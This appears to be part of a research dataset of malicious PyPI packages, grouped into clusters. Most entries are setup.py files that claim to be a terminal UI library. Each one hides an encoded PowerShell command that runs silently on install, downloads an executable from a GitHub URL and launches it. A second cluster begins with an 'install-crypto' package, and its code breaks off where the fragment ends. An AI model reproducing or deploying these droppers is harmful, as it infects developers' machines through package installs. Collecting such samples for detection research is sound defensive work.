        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstrresuper',\n    packages = ['modlib'],\n    version = '4.55',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selframstudyget-v8.9",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selframstudyget',\n    packages = ['modlib'],\n    version = '7.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-selfstringpullpush-v4.2",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfstringpullpush',\n    packages = ['modlib'],\n    version = '3.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-tpccpinghacked-v8.85",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpccpinghacked',\n    packages = ['modlib'],\n    version = '7.50',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-tpcvultrainfo-v1.50",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpcvultrainfo',\n    packages = ['modlib'],\n    version = '8.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-tpliburlver-v3.54",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpliburlver',\n    packages = ['modlib'],\n    version = '2.9',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-tpmaskintelpull-v3.12",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmaskintelpull',\n    packages = ['modlib'],\n    version = '6.81',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-tpmaskvisacontrol-v4.97",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpmaskvisacontrol',\n    packages = ['modlib'],\n    version = '7.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-tppeppushpyw-v3.5",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppeppushpyw',\n    packages = ['modlib'],\n    version = '6.34',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-tppinghackedpaypal-v6.85",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppinghackedpaypal',\n    packages = ['modlib'],\n    version = '6.80',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-tppongadultra-v1.83",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppongadultra',\n    packages = ['modlib'],\n    version = '7.40',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-03-tppywloadhydra-v2.20",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tppywloadhydra',\n    packages = ['modlib'],\n    version = '8.94',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpreplacekillram-v3.93",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpreplacekillram',\n    packages = ['modlib'],\n    version = '1.37',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-tpstudystringpep-v8.79",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpstudystringpep',\n    packages = ['modlib'],\n    version = '4.41',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-03-02-esqcpupipkill-v9.35",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBUADQAaABnAC8AZQBlAGUALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AUwB0AGEAZwBlADEALgBlAHgAZQAiACAALQBPAHUAdABGAGkAbABlACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiADsAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIA', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqcpupipkill',\n    packages = ['modlib'],\n    version = '3.92',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      }
    ]
  },
  {
    "cluster_id": 9,
    "size": 12,
    "all_members": [
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-05-20-install-crypto-v4.18.5",
        "code": "from setuptools import setup, find_packages\n\n\nVERSION = '4.18.5'\nDESCRIPTION = 'A package for network communication'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"install-crypto\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = 